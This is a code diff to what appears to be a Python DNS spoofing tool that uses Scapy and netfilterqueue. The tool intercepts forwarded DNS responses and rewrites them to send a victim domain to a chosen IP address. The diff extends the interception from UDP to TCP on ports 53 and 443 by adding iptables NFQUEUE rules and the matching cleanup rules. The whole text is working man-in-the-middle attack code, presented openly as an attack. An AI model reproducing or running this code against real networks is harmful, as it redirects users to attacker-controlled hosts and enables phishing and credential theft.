@@ -1,4 +1,4 @@
-from scapy.all import DNS, DNSQR, DNSRR, IP, UDP
+from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, TCP
 import argparse
 import netfilterqueue
 import os
@@ -20,9 +20,12 @@ def dns_response(pkt, interface, redirected_ip, victim_domain=None, verbose=Fals
             # Deleted fields will be rebuilt automatically by Scapy with the correct value
             del packet[IP].len
             del packet[IP].chksum
-            del packet[UDP].len
-            del packet[UDP].chksum
-
+            if packet.haslayer(UDP):
+                del packet[UDP].len
+                del packet[UDP].chksum
+            '''if packet.haslayer(TCP):
+                #del packet[TCP].len
+                del packet[TCP].chksum'''
             pkt.set_payload(bytes(packet))
             
             if verbose:
@@ -34,10 +37,13 @@ def dns_response(pkt, interface, redirected_ip, victim_domain=None, verbose=Fals
         print("Packet forwarded\n")
 
 def dns_attack(interface, redirected_ip, victim_domain=None, verbose=False):
+    print('DNS attack running...')
     # Setup iptables
     #os.system("iptables -A FORWARD -j ACCEPT")
     os.system("iptables -I FORWARD -p udp --sport 53 -j NFQUEUE --queue-num 0")
     os.system("iptables -I FORWARD -p udp --sport 443 -j NFQUEUE --queue-num 0")
+    os.system("iptables -I FORWARD -p tcp --sport 53 -j NFQUEUE --queue-num 0")
+    os.system("iptables -I FORWARD -p tcp --sport 443 -j NFQUEUE --queue-num 0") 
 
     queue = netfilterqueue.NetfilterQueue()
 
@@ -52,7 +58,9 @@ def dns_attack(interface, redirected_ip, victim_domain=None, verbose=False):
         
         # Flush iptables
         os.system("iptables -D FORWARD -p udp --sport 53 -j NFQUEUE --queue-num 0")
-        os.system("iptables -D FORWARD -p udp --sport 443 -j NFQUEUE --queue-num 0")    
+        os.system("iptables -D FORWARD -p udp --sport 443 -j NFQUEUE --queue-num 0")
+        os.system("iptables -D FORWARD -p tcp --sport 53 -j NFQUEUE --queue-num 0")
+        os.system("iptables -D FORWARD -p tcp --sport 443 -j NFQUEUE --queue-num 0") 
 
         queue.unbind()
 
